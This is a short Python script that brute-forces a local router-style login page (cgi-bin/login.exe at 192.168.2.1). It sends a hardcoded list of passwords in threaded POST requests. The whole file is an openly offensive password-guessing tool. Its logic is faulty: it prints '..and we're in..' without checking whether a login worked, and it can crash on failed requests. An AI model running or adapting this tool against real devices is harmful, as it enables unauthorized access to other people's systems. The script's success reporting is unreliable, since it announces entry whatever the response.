import urllib3
from urllib import parse, request, error
import time
import threading

class Bruter:

    baseUrl = "http://192.168.2.1/"
    postUrl = baseUrl + "cgi-bin/login.exe"
    # postUrl = baseUrl + "cgi-bin/logout.exe"
    passwords = ["d41d8cd98f00b204e9800998ecf8427e", "ef21cdedfaedfad21124ceff", 312545405042, 454545454212454, 89785212477025]
    headers = {'Content-Type': 'application/x-www-form-urlencoded'}

    def __init__(self):
        print("[!] Starting brutal force on %s" % self.postUrl)
        for password in self.passwords:
            time.sleep(1)
            threading.Thread(target=self.attemptLogin, args=[password]).start()

    def attemptLogin(self, password):
        print("[>] Trying %s" % password)
        try:
            parameters = parse.urlencode({"pws": password}).encode("utf8")
            request_ = request.Request(self.postUrl, data=parameters, headers=self.headers, method="POST")
            response = request.urlopen(request_)
            response = response.read()

        except error.HTTPError as e:
            print(str(e.code))
            pass

        print("..and we're in.. \n " + response.decode("utf8"))

Bruter()
